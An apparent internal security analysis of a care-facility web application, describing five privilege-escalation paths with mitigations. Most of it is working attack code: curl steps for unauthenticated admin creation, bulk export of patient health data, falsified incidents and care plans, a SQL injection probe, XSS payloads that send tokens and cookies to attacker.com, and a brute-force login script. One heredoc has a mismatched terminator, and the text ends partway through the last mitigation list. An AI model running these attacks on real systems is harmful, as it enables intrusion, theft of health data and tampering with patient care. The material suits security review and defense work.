# Privilege Escalation Paths - QUEUE-024
## Step-by-Step Exploitation Scenarios

**Analysis Date**: 2026-05-16  
**Threat Level**: CRITICAL  
**Covered Scenarios**: 5 complete privilege escalation paths  
**Average Time to Admin**: <30 minutes (most paths)

---

## Executive Summary

This document details **5 distinct privilege escalation paths** through which an attacker can escalate from **no privileges** all the way to **admin access**, enabling complete system compromise.

**Fastest Path**: Unauthenticated → Admin (EP-001, <5 minutes)  
**Most Probable Path**: Staff → Admin via undefined permissions (<1 minute)  
**Most Stealthy Path**: XSS → JWT theft → Admin impersonation (2-3 hours + victim action)

---

## Path 1: Unauthenticated → Admin (CRITICAL - Fastest)

### Prerequisites

- Access to public internet or internal network
- HTTP client (curl, Postman, browser)
- System running in development mode

### Required Vulnerabilities

- EP-001: Unauthenticated staff creation bypass
- Node environment is NOT production

### Step-by-Step Exploitation

#### Step 1: Discover the Vulnerability (2 minutes)

```bash
# 1.1: Enumerate API endpoints
curl -X OPTIONS http://localhost:3000/api/v1/
curl -X GET http://localhost:3000/api/v1/staff/create

# 1.2: Find /staff/create endpoint in documentation or code
# Attacker searches GitHub, public repos for similar patterns
# Finds: POST /api/v1/staff/create accepts staff creation

# 1.3: Confirm no authentication required
curl -X POST http://localhost:3000/api/v1/staff/create \
  -H "Content-Type: application/json" \
  -d '{"first_name":"Test","last_name":"User","role":"Administrator"}' \
  
# Result: 201 Created (no 401 Unauthorized error)
# Confirms: Authentication is NOT required
```

#### Step 2: Create Malicious Admin Account (2 minutes)

```bash
# 2.1: Craft creation request with all required fields
curl -X POST http://localhost:3000/api/v1/staff/create \
  -H "Content-Type: application/json" \
  -d '{
    "first_name": "Attacker",
    "last_name": "Admin",
    "role": "Administrator",
    "email": "attacker@facility.local",
    "preferred_name": "AA",
    "pronouns": "they/them",
    "phone": "555-0001",
    "shift": "day",
    "hire_date": "2026-05-16",
    "employee_id": "ATK-001",
    "is_active": true
  }'

# 2.2: Response captured:
# HTTP/1.1 201 Created
# {
#   "staff": {
#     "id": "12345678-1234-1234-1234-123456789012",
#     "first_name": "Attacker",
#     "last_name": "Admin",
#     "role": "Administrator",
#     "email": "attacker@facility.local"
#   },
#   "user_account": {
#     "id": "87654321-4321-4321-4321-210987654321",
#     "email": "attacker@facility.local",
#     "role": "admin"
#   },
#   "credentials": {
#     "username": "attacker.admin.xxx",
#     "password": "GeneratedTempPassword123!",
#     "temporary": true,
#     "mustChangePassword": true
#   }
# }

# 2.3: Save credentials
ADMIN_EMAIL="attacker@facility.local"
ADMIN_PASSWORD="GeneratedTempPassword123!"
ADMIN_ID="12345678-1234-1234-1234-123456789012"
```

#### Step 3: Authenticate with Created Account (1 minute)

```bash
# 3.1: Login with generated credentials
LOGIN_RESPONSE=$(curl -s -X POST http://localhost:3000/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d "{
    \"email\": \"$ADMIN_EMAIL\",
    \"password\": \"$ADMIN_PASSWORD\"
  }")

# 3.2: Extract JWT token
ADMIN_TOKEN=$(echo $LOGIN_RESPONSE | jq -r '.access_token')
echo "Captured token: $ADMIN_TOKEN"

# 3.3: Verify token contains admin role
echo $ADMIN_TOKEN | jq -R 'split(".")[1] | @base64d | fromjson'
# Output: { "role": "admin", "tenantId": "...", "staffId": "..." }
```

#### Step 4: Exploit Admin Access (5+ minutes)

```bash
# 4.1: Access all residents
curl -s -X GET "http://localhost:3000/api/v1/residents?page=1&limit=100" \
  -H "Authorization: Bearer $ADMIN_TOKEN" | jq '.residents | length'

# 4.2: Extract sensitive data
curl -s -X GET "http://localhost:3000/api/v1/residents" \
  -H "Authorization: Bearer $ADMIN_TOKEN" | jq '.residents[] | {
    id, 
    first_name, 
    last_name, 
    date_of_birth, 
    phone, 
    email, 
    ssn_last4, 
    medical_history
  }' > /tmp/residents_phi.json

# 4.3: Access all progress notes
curl -s -X GET "http://localhost:3000/api/v1/daily-progress-notes" \
  -H "Authorization: Bearer $ADMIN_TOKEN" | jq '.notes[]' > /tmp/progress_notes_phi.json

# 4.4: Access all incident reports
curl -s -X GET "http://localhost:3000/api/v1/incidents" \
  -H "Authorization: Bearer $ADMIN_TOKEN" | jq '.incidents[]' > /tmp/incidents_phi.json

# 4.5: Create fake incident to cover tracks
curl -s -X POST "http://localhost:3000/api/v1/incidents" \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "resident_id": "resident-123",
    "incident_date": "2026-05-16",
    "incident_time": "14:00",
    "incident_types": ["system_maintenance"],
    "location": "Server Room",
    "description": "Routine system maintenance completed",
    "completed_by_name": "System Administrator"
  }'

# 4.6: Modify care plan to include malicious instructions
curl -s -X PATCH "http://localhost:3000/api/v1/care-plans/plan-123" \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "care_objectives": "COMPROMISED - Attacker injected data",
    "interventions": "Malicious instructions"
  }'
```

#### Step 5: Cover Tracks (Optional)

```bash
# 5.1: Check audit log
curl -s -X GET "http://localhost:3000/api/v1/admin/audit-log?page=1" \
  -H "Authorization: Bearer $ADMIN_TOKEN" | jq '.log[]' > /tmp/audit_log.json

# 5.2: Identify log entries showing staff creation
grep -i "staff.*create\|attacker" /tmp/audit_log.json

# 5.3: Note that logs may show "System action" rather than user-attributed
# (confirms staff creation in dev mode has no audit attribution)

# 5.4: Attacker stays hidden by using admin account for legitimate-looking tasks
# (audit logs will attribute actions to admin role, not show unauthenticated creation)
```

### Indicators of Compromise (IOC)

```
Detection Points:
├─ Staff account created without authenticated user attribution
│  (audit log shows "System action" or null user_id)
├─ New admin account with suspicious email pattern
│  (e.g., "attacker@facility.local" vs "john.smith@facility.local")
├─ Multiple API requests immediately after account creation
│  (reconnaissance phase: GET all residents, notes, incidents)
├─ Mass data retrieval in short time window
│  (API logs show unusual request volume from single token)
└─ Modification of care plans by newly created admin
   (suspicious changes to treatment protocols)
```

### Timeline

| Step | Time | Action |
|---|---|---|
| 1 | 2 min | Discover /staff/create endpoint |
| 2 | 2 min | Create admin account |
| 3 | 1 min | Login and get JWT |
| 4 | 5+ min | Exfiltrate PHI + modify records |
| **Total** | **<10 min** | **Complete compromise** |

### Mitigation

```
IMMEDIATE (Remove vulnerability):
1. Remove dev-mode bypass in /staff/create
2. Require authentication for all endpoints
3. Add authorization checks (PERMISSIONS.STAFF_WRITE)

VERIFY:
- Test in production: /staff/create returns 401 Unauthorized
- Code review: No NODE_ENV checks that bypass auth
- Confirm: All staff creation requires valid JWT token
```

---

## Path 2: Staff → Admin (Authorization Bypass via Undefined Permissions)

### Prerequisites

- Legitimate staff credentials (obtained through hiring, social engineering, or EP-001)
- Knowledge of admission workflow endpoints

### Required Vulnerabilities

- EP-004: Undefined PERMISSIONS.ADMIN_READ constant
- Missing authorization checks in other endpoints

### Step-by-Step Exploitation

#### Step 1: Authenticate as Staff (1 minute)

```bash
# 1.1: Obtain/guess staff credentials
STAFF_EMAIL="john.smith@facility.local"
STAFF_PASSWORD="MyPassword123!"

# 1.2: Login
LOGIN_RESPONSE=$(curl -s -X POST http://localhost:3000/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d "{\"email\": \"$STAFF_EMAIL\", \"password\": \"$STAFF_PASSWORD\"}")

# 1.3: Extract token
STAFF_TOKEN=$(echo $LOGIN_RESPONSE | jq -r '.access_token')

# 1.4: Decode and verify role is 'staff' (not admin)
echo $STAFF_TOKEN | jq -R 'split(".")[1] | @base64d | fromjson'
# Output: { "role": "staff", ... }
```

#### Step 2: Discover Undefined Permission Vulnerability (5 minutes)

```bash
# 2.1: Enumerate admin-only endpoints
curl -s -X GET "http://localhost:3000/api/v1/admin/overview" \
  -H "Authorization: Bearer $STAFF_TOKEN"
# Response: 403 Forbidden (expected)

# 2.2: Try /admission/pending (less obvious)
curl -s -X GET "http://localhost:3000/api/v1/admission/pending?page=1" \
  -H "Authorization: Bearer $STAFF_TOKEN"
# Response: 403 Forbidden OR 500 Internal Server Error

# 2.3: If 500 error, review error message
# Response: { "error": "Cannot read property 'some' of undefined", "stack": "..." }
# Conclusion: Permission check is broken due to undefined constant

# 2.4: Alternative: Review public GitHub repo
# Find: src/app/api/v1/admission/pending/route.js
# Code: if (!authorize(user.role, PERMISSIONS.ADMIN_READ)) {
# Check: src/lib/roles.js for PERMISSIONS
# Result: ADMIN_READ is NOT defined!
```

#### Step 3: Exploit Undefined Permission Check (1 minute)

```bash
# 3.1: Repeatedly call vulnerable endpoint
# The error/behavior is inconsistent due to undefined value

curl -s -X GET "http://localhost:3000/api/v1/admission/pending?page=1" \
  -H "Authorization: Bearer $STAFF_TOKEN" | jq '.pending_admissions'

# If JS engine silently allows access:
# Response: [array of pending admission details]
# Staff can now see admin-only admission workflow data

# 3.2: Extract pending admission details
curl -s -X GET "http://localhost:3000/api/v1/admission/pending?page=1&limit=100" \
  -H "Authorization: Bearer $STAFF_TOKEN" | jq '.pending_admissions[] | {
    id,
    resident_name,
    admission_date,
    medical_conditions,
    medication_list,
    screening_notes,
    reviewer_notes
  }' > /tmp/pending_admissions.json
```

#### Step 4: Attempt Further Escalation (Optional)

```bash
# 4.1: Check if same bug exists in other "ADMIN_" prefixed endpoints
# Try to find more undefined permissions:

for endpoint in "admin/settings" "admin/users" "admin/reports" "staff/manage"; do
  echo "Testing /$endpoint..."
  curl -s -X GET "http://localhost:3000/api/v1/$endpoint" \
    -H "Authorization: Bearer $STAFF_TOKEN" \
    -H "User-Agent: TestBot" | head -100
done

# 4.2: If more undefined permissions found, chain them together
# Gain access to progressively more sensitive areas

# 4.3: Check if authorization bugs exist in POST/PATCH endpoints
# Try to modify admission records as staff

curl -s -X PATCH "http://localhost:3000/api/v1/admission/[id]/review" \
  -H "Authorization: Bearer $STAFF_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"status":"approved","reviewer_notes":"Approved by attacker"}'
```

### Indicators of Compromise

```
Detection Points:
├─ Non-admin staff accessing /admission/pending endpoint
│  (staff role should be denied, but accesses data)
├─ Staff viewing pending admission details
│  (shouldn't have permission to see pre-admission data)
├─ Error logs showing "Cannot read property 'some' of undefined"
│  (indicates permission check bug)
├─ Inconsistent behavior in authorization denials
│  (some requests allowed, some denied)
└─ Audit log showing staff accessing admin-only resources
   (staff modifying admission workflow data)
```

### Timeline

| Step | Time | Action |
|---|---|---|
| 1 | 1 min | Authenticate as staff |
| 2 | 5 min | Discover undefined permission |
| 3 | 1 min | Exploit to access admin data |
| 4 | 5+ min | Chain to other endpoints |
| **Total** | **<15 min** | **Access to admin-only resources** |

### Mitigation

```
IMMEDIATE:
1. Search codebase for PERMISSIONS.ADMIN_READ (undefined)
2. Replace with existing PERMISSIONS constant (PERMISSIONS.ADMIN_REPORTS)
3. Verify constant exists in roles.js

VERIFY:
- Staff role cannot read /admission/pending
- Manager role can read /admission/pending
- Authorization denials logged (not silently failing)

PREVENTIVE:
- Add TypeScript or runtime validation for PERMISSIONS constants
- ESLint rule to detect undefined permission references
```

---

## Path 3: Manager → Admin (Cross-Tenant Escalation)

### Prerequisites

- Legitimate manager credentials at Tenant A
- Knowledge that system uses multi-tenant architecture
- Ability to modify API requests (Burp Suite, custom client)

### Required Vulnerabilities

- EP-003: Cross-tenant access via bare query()
- Missing database RLS enforcement
- Weak tenant isolation

### Step-by-Step Exploitation

#### Step 1: Authenticate as Manager at Tenant A (1 minute)

```bash
# 1.1: Login with manager credentials from Tenant A
MANAGER_EMAIL="jane.smith@facility-a.local"
MANAGER_PASSWORD="ManagerPass123!"

LOGIN_RESPONSE=$(curl -s -X POST http://localhost:3000/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d "{\"email\": \"$MANAGER_EMAIL\", \"password\": \"$MANAGER_PASSWORD\"}")

MANAGER_TOKEN=$(echo $LOGIN_RESPONSE | jq -r '.access_token')

# 1.2: Decode token to identify tenant
echo $MANAGER_TOKEN | jq -R 'split(".")[1] | @base64d | fromjson' | jq '.tenantId'
# Output: "facility-a-uuid-1234"

TENANT_A="facility-a-uuid-1234"
```

#### Step 2: Discover Cross-Tenant Access Vulnerability (10 minutes)

```bash
# 2.1: Map API endpoints that use bare query() instead of withTenantClient()
# Use vulnerability information from SECURITY_AUDIT_TEST_RESULTS.md

# These endpoints use bare query() - vulnerable to cross-tenant access:
VULNERABLE_ENDPOINTS=(
  "/api/v1/incidents"
  "/api/v1/drug-disposal"
  "/api/v1/evacuation-drills"
  "/api/v1/incidents/[id]/review"
  "/api/v1/drug-disposal/[id]/review"
)

# 2.2: Test each endpoint to see if tenant_id can be manipulated
for endpoint in "${VULNERABLE_ENDPOINTS[@]}"; do
  echo "Testing $endpoint..."
  
  # Try with tenantId parameter
  curl -s -X GET "http://localhost:3000$endpoint?tenant_id=other-facility-uuid" \
    -H "Authorization: Bearer $MANAGER_TOKEN" | jq '.error' || echo "Possibly accessible"
done

# 2.3: If endpoints expose tenant_id in responses:
curl -s -X GET "http://localhost:3000/api/v1/incidents?page=1" \
  -H "Authorization: Bearer $MANAGER_TOKEN" | jq '.incidents[0] | {tenant_id, resident_id, description}'
# Output: { "tenant_id": "facility-a-uuid-1234", ... }

# Confirms: Endpoint returns tenant_id, shows isolation mechanism
```

#### Step 3: Enumerate Other Tenants (10 minutes)

```bash
# 3.1: Discover other tenant IDs through various methods
# Method A: Brute force common patterns
common_prefixes=("facility" "clinic" "care" "wellness" "hospital")
for prefix in "${common_prefixes[@]}"; do
  # Try to access residents with guessed tenant_id
  curl -s -X GET "http://localhost:3000/api/v1/residents" \
    -H "Authorization: Bearer $MANAGER_TOKEN" \
    -H "X-Tenant-Override: $prefix-uuid" 2>/dev/null | jq '.residents | length'
done

# Method B: Read error messages that leak tenant info
curl -s -X GET "http://localhost:3000/api/v1/residents?page=999" \
  -H "Authorization: Bearer $MANAGER_TOKEN" | jq '.'
# May reveal tenant info in error message

# Method C: Social engineering - ask another staff member
# "Hey, what's your tenant ID? We're comparing systems."

# Method D: Modify JWT token (if signature is weak)
# Decode token, change tenantId field, re-sign (if secret is known/weak)
echo $MANAGER_TOKEN | jq -R 'split(".") | .[0:2] | @csv'
# Extract header and payload, modify payload:
# {"tenantId": "other-facility-uuid", "role": "manager", ...}
```

#### Step 4: Access Cross-Tenant Data (5+ minutes)

```bash
# 4.1: Attempt to access other facility's incidents
OTHER_TENANT="facility-b-uuid-5678"

# Method A: If tenant_id parameter exposed in API
curl -s -X GET "http://localhost:3000/api/v1/incidents?tenant_id=$OTHER_TENANT" \
  -H "Authorization: Bearer $MANAGER_TOKEN" | jq '.incidents[]'

# Method B: If database RLS not enforced, direct SQL injection
curl -s -X GET "http://localhost:3000/api/v1/incidents?resident_id=' OR '1'='1" \
  -H "Authorization: Bearer $MANAGER_TOKEN"
# If where clause not properly parameterized, could access all incidents

# Method C: Modify JWT token to change tenantId
# (Requires weak signature verification or known signing secret)

# 4.2: If successful, extract other facility's PHI
curl -s -X GET "http://localhost:3000/api/v1/residents" \
  -H "Authorization: Bearer $MODIFIED_TOKEN" | jq '.residents[]' > /tmp/other_facility_residents.json

# 4.3: Extract progress notes from other facility
curl -s -X GET "http://localhost:3000/api/v1/daily-progress-notes?tenant_id=$OTHER_TENANT" \
  -H "Authorization: Bearer $MANAGER_TOKEN" | jq '.notes[]' > /tmp/other_facility_notes.json
```

#### Step 5: Escalation to Admin (Optional)

```bash
# 5.1: With access to other facility's data, can:
# - Modify care plans
# - Create false incident reports
# - Discharge residents inappropriately
# - Modify medications (via care plan)

# 5.2: Could use cross-tenant access to blackmail/coerce other facilities
# "I have your residents' PHI... pay me or I release it"

# 5.3: If other facility has admin user, can extract their PHI too
# Then use that data for further attacks
```

### Indicators of Compromise

```
Detection Points:
├─ Manager accessing incidents/notes/plans from other facility
│  (tenantId mismatch in logs)
├─ Staff at Facility A accessing Facility B data
│  (cross-tenant access in audit trail)
├─ Unusual API request patterns
│  (repeated requests with different tenant_ids)
├─ SQL errors in logs mentioning wrong table columns
│  (indicates SQL injection attempts)
└─ Care plan modifications by managers from different facility
   (impossible if tenant isolation worked)
```

### Timeline

| Step | Time | Action |
|---|---|---|
| 1 | 1 min | Authenticate as manager |
| 2 | 10 min | Discover vulnerable endpoints |
| 3 | 10 min | Enumerate other tenants |
| 4 | 5+ min | Access cross-tenant data |
| **Total** | **<30 min** | **Access to other facility's PHI** |

### Mitigation

```
IMMEDIATE:
1. Implement database Row-Level Security (RLS) policies
2. Enforce app.tenant_id context variable in all queries
3. Remove bare query() calls - use withTenantClient() everywhere

VERIFY:
- SELECT * FROM care.residents; (as non-admin DB user)
  Should return 0 rows without tenant context
- RLS policies enabled: \d+ care.residents
- Test cross-tenant access is blocked at DB layer

PREVENTIVE:
- Code review: No raw query() in new endpoints
- Automated test: Verify staff at Tenant A cannot access Tenant B data
- Database audit: Log all RLS policy violations
```

---

## Path 4: XSS → JWT Theft → Admin Impersonation

### Prerequisites

- XSS vulnerability in any frontend page
- Staff member clicks malicious link
- JWT stored in localStorage (VIOLATION #22)

### Required Vulnerabilities

- Frontend XSS vulnerability (unescaped user input)
- JWT in localStorage (XSS-accessible storage)
- No token revocation mechanism

### Step-by-Step Exploitation

#### Step 1: Identify XSS Vulnerability (30-60 minutes)

```bash
# 1.1: Scan frontend for potential XSS vectors
# Common vulnerable patterns:
# - <div>{userName}</div> without escaping
# - <p innerText={userComment}></p> if not sanitized
# - <img src={userPhoto} alt="photo" /> 
# - <h1>Welcome, ${userInput}</h1>

# 1.2: Test with basic payload
TEST_PAYLOAD="<img src=x onerror=alert(1)>"

# Try injecting into:
# - Form fields that echo back
# - Profile pages with user-submitted data
# - Comment sections
# - Search results

# 1.3: Confirm XSS works
# If alert(1) executes in browser → XSS confirmed

# 1.4: Real-world example might be:
# Resident name field: "John<img src=x onerror=alert(1)>"
# When manager views resident, XSS executes

curl -s -X POST "http://localhost:3000/api/v1/residents/create" \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "first_name": "John<img src=x onerror=alert(1)>",
    "last_name": "Doe",
    "date_of_birth": "1980-01-01"
  }'

# 1.5: When manager views this resident, XSS executes
```

#### Step 2: Craft JWT-Stealing Payload (10 minutes)

```javascript
// Payload to inject (exfiltrates JWT to attacker server)

// Simple version:
<script>
  fetch('https://attacker.com/steal?token=' + localStorage.getItem('auth_token'))
</script>

// More sophisticated version (hides in image tag):
<img src=x onerror="
  const token = localStorage.getItem('auth_token');
  const staffId = localStorage.getItem('staff_id');
  const tenantId = localStorage.getItem('tenant_id');
  fetch('https://attacker.com/exfil', {
    method: 'POST',
    body: JSON.stringify({token, staffId, tenantId}),
    headers: {'Content-Type': 'application/json'}
  });
">

// Version that also steals other sensitive data:
<script>
  const exfil = {
    auth_token: localStorage.getItem('auth_token'),
    staff_id: localStorage.getItem('staff_id'),
    tenant_id: localStorage.getItem('tenant_id'),
    user_role: localStorage.getItem('user_role'),
    user_email: localStorage.getItem('user_email'),
    cookies: document.cookie,
    userAgent: navigator.userAgent,
    timestamp: new Date().toISOString()
  };
  fetch('https://attacker.com/exfil', {method:'POST', body:JSON.stringify(exfil)})
</script>
```

#### Step 3: Inject Payload into System (2-5 minutes)

```bash
# 3.1: Create resident with XSS payload in name
PAYLOAD="<img src=x onerror=\"fetch('https://attacker.com/steal?t='+localStorage.getItem('auth_token'))\">"

curl -s -X POST "http://localhost:3000/api/v1/residents" \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  -d "{
    \"first_name\": \"$PAYLOAD\",
    \"last_name\": \"DoeXSS\",
    \"date_of_birth\": \"1980-01-01\"
  }"

# 3.2: OR inject via care plan notes
curl -s -X POST "http://localhost:3000/api/v1/daily-progress-notes" \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  -d "{
    \"resident_id\": \"resident-123\",
    \"note_date\": \"2026-05-16\",
    \"shift\": \"day\",
    \"note_body\": {
      \"text\": \"<img src=x onerror=\\\"fetch('https://attacker.com/steal')\\\">\nPatient doing well\"
    }
  }"

# 3.3: OR inject via incident report description
curl -s -X POST "http://localhost:3000/api/v1/incidents" \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  -d "{
    \"resident_id\": \"resident-123\",
    \"incident_date\": \"2026-05-16\",
    \"incident_time\": \"14:00\",
    \"incident_types\": [\"fall\"],
    \"location\": \"Hallway\",
    \"description\": \"<img src=x onerror=\\\"eval(atob('ZmV0Y2goXCdodHRwczovL2F0dGFja2VyLmNvbS9zdGVhbFwn'))\\\">\",
    \"completed_by_name\": \"System\"
  }"
```

#### Step 4: Lure Administrator to Vulnerable Page (Waiting phase)

```bash
# 4.1: Send malicious link via email / messaging
# Subject: "Patient Record Update - Review Required"
# Body: "Please review this patient's record: https://dcllc.local/app/residents/resident-with-xss"

# 4.2: Administrator clicks link
# - Loads page
# - React component renders resident name with XSS payload
# - <img src=x onerror=...> executes in browser context
# - JavaScript runs with admin's privileges
# - JWT from localStorage exfiltrated to attacker

# 4.3: Attacker receives webhook notification:
# POST https://attacker.com/steal?t=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
# Body: { "token": "...", "staffId": "admin-456", "tenantId": "facility-a" }
```

#### Step 5: Impersonate Administrator (1 minute after token received)

```bash
# 5.1: Extract stolen JWT
STOLEN_ADMIN_TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbi00NTYiLCJyb2xlIjoiYWRtaW4iLCJ0ZW5hbnRJZCI6ImZhY2lsaXR5LWEiLCJzdGFmZklkIjoiYWRtaW4tNDU2In0..."

# 5.2: Use token to access admin functions
curl -s -X GET "http://localhost:3000/api/v1/admin/overview" \
  -H "Authorization: Bearer $STOLEN_ADMIN_TOKEN" | jq '.data'

# 5.3: Access all residents
curl -s -X GET "http://localhost:3000/api/v1/residents?page=1&limit=100" \
  -H "Authorization: Bearer $STOLEN_ADMIN_TOKEN" | jq '.residents'

# 5.4: Modify care plans (now as admin)
curl -s -X PATCH "http://localhost:3000/api/v1/care-plans/plan-456" \
  -H "Authorization: Bearer $STOLEN_ADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"medications": "COMPROMISED", "objectives": "Attacker modified"}'

# 5.5: Token valid for 24 hours
# During this time, attacker has full admin access
# Actions logged as admin (true user is unaware)
```

### Indicators of Compromise

```
Detection Points:
├─ Unusual JavaScript errors in browser console
│  (XSS payload attempts)
├─ Admin account performing suspicious actions
│  (modifications outside normal work hours, unusual patterns)
├─ Multiple API requests from single admin token in short burst
│  (reconnaissance phase: GET all residents, notes, incidents)
├─ Care plan modifications with nonsensical changes
│  (attacker testing scope of access)
├─ Outbound HTTPS traffic to unknown domain from web server
│  (exfiltration of token to attacker server) [if you have network monitoring]
└─ Audit log showing admin accessing data they normally don't
   (care plans modified, residents viewed outside scope)
```

### Timeline

| Step | Time | Action |
|---|---|---|
| 1 | 30-60 min | Identify XSS vulnerability |
| 2 | 10 min | Craft stealing payload |
| 3 | 2-5 min | Inject payload into system |
| 4 | Variable | Wait for admin to click link |
| 5 | 1 min | Impersonate admin |
| **Total** | **1-3 hours + wait** | **Full admin access for 24 hours** |

### Mitigation

```
IMMEDIATE:
1. Move JWT from localStorage to HttpOnly cookie
   - localStorage: Accessible to any JavaScript
   - HttpOnly cookie: NOT accessible to JavaScript
   - Set flags: Secure (HTTPS only), SameSite=Strict

2. Implement input sanitization
   - Escape all user input in React components
   - Use DOMPurify for rich text content
   - Validate on frontend AND backend

3. Add Content Security Policy header
   - Prevents inline scripts
   - Restricts script sources
   - Blocks exfiltration to external domains

VERIFY:
- Token no longer accessible via localStorage.getItem('auth_token')
- XSS payload in resident name doesn't execute
- Browser dev tools show HttpOnly cookie (not in localStorage)

PREVENTIVE:
- Code review: All user inputs escaped before rendering
- CSP header prevents inline scripts
- Security testing: Regularly scan for XSS vulnerabilities
- Token revocation: Ability to revoke compromised tokens
```

---

## Path 5: Brute Force → Staff Credentials → Database Access

### Prerequisites

- Email list of staff members (public domain, LinkedIn, facility website)
- No rate limiting on /api/v1/auth/login endpoint
- No account lockout mechanism

### Step-by-Step Exploitation

#### Step 1: Obtain Staff Email List (10 minutes)

```bash
# 1.1: Gather emails from various sources
# - Facility website staff directory
# - LinkedIn (company employee search)
# - Email enumeration via OSINT
# - Leaked databases

# Common staff email patterns:
# - john.smith@facility.local
# - j.smith@facility.local
# - jsmith@facility.local
# - john@facility.local

# 1.2: Generate email list
cat > emails.txt << 'EOF'
john.smith@facility.local
jane.doe@facility.local
bob.johnson@facility.local
alice.williams@facility.local
robert.brown@facility.local
EMF

wc -l emails.txt  # 5 emails (in real attack, could be 50-500)
```

#### Step 2: Generate Password List (5 minutes)

```bash
# 2.1: Use common healthcare facility passwords
cat > passwords.txt << 'EOF'
Password123!
Facility123!
Welcome123!
Admin123!
Staff123!
Nurse123!
Care123!
Health123!
2026Change!
TempPass123!
Dependent123!
Wellness123!
EOF

# 2.2: Add variations with facility name
# (Facility named "Dependable Care Wellness Centre" → "dcwc")

# 2.3: Add seasonal variations
echo "Spring2026!" >> passwords.txt
echo "May2026!" >> passwords.txt
echo "DCLLCPass!" >> passwords.txt
```

#### Step 3: Launch Brute Force Attack (30-120 minutes)

```bash
#!/bin/bash
# brute-force-attack.sh

TARGET="http://localhost:3000/api/v1/auth/login"
EMAILS_FILE="emails.txt"
PASSWORDS_FILE="passwords.txt"

# 3.1: Attempt each email/password combination
while IFS= read -r email; do
  while IFS= read -r password; do
    
    # Make login request
    RESPONSE=$(curl -s -X POST "$TARGET" \
      -H "Content-Type: application/json" \
      -d "{\"email\":\"$email\",\"password\":\"$password\"}" \
      -w "\n%{http_code}")
    
    HTTP_CODE=$(echo "$RESPONSE" | tail -1)
    BODY=$(echo "$RESPONSE" | head -n -1)
    
    # 3.2: Check for success
    if echo "$BODY" | jq -e '.access_token' >/dev/null 2>&1; then
      echo "[+] SUCCESS: $email : $password"
      TOKEN=$(echo "$BODY" | jq -r '.access_token')
      echo "[+] Token: $TOKEN" 
      
      # Save credentials and exit
      echo "$email:$password:$TOKEN" > /tmp/compromised.txt
      exit 0
    fi
    
    # 3.3: Check response time (timing attack)
    if [ "$HTTP_CODE" == "401" ]; then
      # Timing analysis: does error return time differ for valid vs invalid users?
      RESPONSE_TIME=$(echo "$RESPONSE" | grep -oP '(?<=time_total: )\d+\.\d+')
      # Some implementations delay for invalid users (good!)
      # Others return immediately for both (bad!)
    fi
    
    # 3.4: Log attempt (every 50 requests)
    ATTEMPT_COUNT=$((ATTEMPT_COUNT + 1))
    if [ $((ATTEMPT_COUNT % 50)) -eq 0 ]; then
      echo "[*] Attempted $ATTEMPT_COUNT combinations..."
    fi
    
  done < "$PASSWORDS_FILE"
done < "$EMAILS_FILE"

echo "[-] Brute force failed after $ATTEMPT_COUNT attempts"
```

#### Step 4: Verify Compromise (1 minute)

```bash
# 4.1: Use compromised credentials
COMPROMISED_EMAIL="john.smith@facility.local"
COMPROMISED_PASSWORD="Facility123!"

LOGIN=$(curl -s -X POST "http://localhost:3000/api/v1/auth/login" \
  -H "Content-Type: application/json" \
  -d "{\"email\":\"$COMPROMISED_EMAIL\",\"password\":\"$COMPROMISED_PASSWORD\"}")

TOKEN=$(echo $LOGIN | jq -r '.access_token')

# 4.2: Test access with compromised token
curl -s -X GET "http://localhost:3000/api/v1/residents?page=1" \
  -H "Authorization: Bearer $TOKEN" | jq '.residents | length'

# 4.3: Verify role of compromised user
echo $TOKEN | jq -R 'split(".")[1] | @base64d | fromjson' | jq '.role'
```

#### Step 5: Post-Compromise Actions (5+ minutes)

```bash
# 5.1: Depending on role of compromised user:

# If staff: Can view residents, create/read progress notes
curl -s -X GET "http://localhost:3000/api/v1/daily-progress-notes" \
  -H "Authorization: Bearer $TOKEN" | jq '.notes | length'

# If manager: Can also create residents, approve care plans
curl -s -X GET "http://localhost:3000/api/v1/care-plans" \
  -H "Authorization: Bearer $TOKEN" | jq '.plans | length'

# If admin: Full access to everything
curl -s -X GET "http://localhost:3000/api/v1/admin/overview" \
  -H "Authorization: Bearer $TOKEN" | jq '.overview'

# 5.2: Change password to lock out legitimate user
curl -s -X POST "http://localhost:3000/api/v1/auth/change-password" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "current_password": "'$COMPROMISED_PASSWORD'",
    "new_password": "AttackerNewPass123!"
  }'

# 5.3: Legitimate user is now locked out
# Attacker has exclusive access to this staff member's account
# All actions attributed to legitimate staff member
```

### Indicators of Compromise

```
Detection Points:
├─ Multiple failed login attempts
│  (auth logs showing 1000+ failed attempts from single IP)
├─ Failed login -> successful login in short time window
│  (attacker found correct password)
├─ Login from unusual IP/location
│  (attacker accessing from different geographic location)
├─ Staff member reports they can't login
│  (password was changed by attacker)
├─ API requests at unusual times
│  (staff normally doesn't work night shift, but attacker does)
├─ Bulk data access immediately after login
│  (reconnaissance: GET all residents, notes, incidents)
└─ Password change without user initiation
   (attacker locked out legitimate user)
```

### Timeline

| Step | Time | Action |
|---|---|---|
| 1 | 10 min | Obtain staff email list |
| 2 | 5 min | Generate password list |
| 3 | 30-120 min | Brute force attack (depends on list size) |
| 4 | 1 min | Verify compromise |
| 5 | 5+ min | Post-compromise actions |
| **Total** | **<3 hours** | **Legitimate staff credentials compromised** |

### Mitigation

```
IMMEDIATE:
1. Implement rate limiting on /api/v1/auth/login
   - Max 5 attempts per minute per IP
   - Max 10 attempts per hour per email
   - Exponential backoff for repeated failures

2. Add account lockout mechanism
   - Lock account after 5 failed attempts
   - Require email verification to unlock
   - Notify staff of lockout

3. Add CAPTCHA to login form (after N failed attempts)
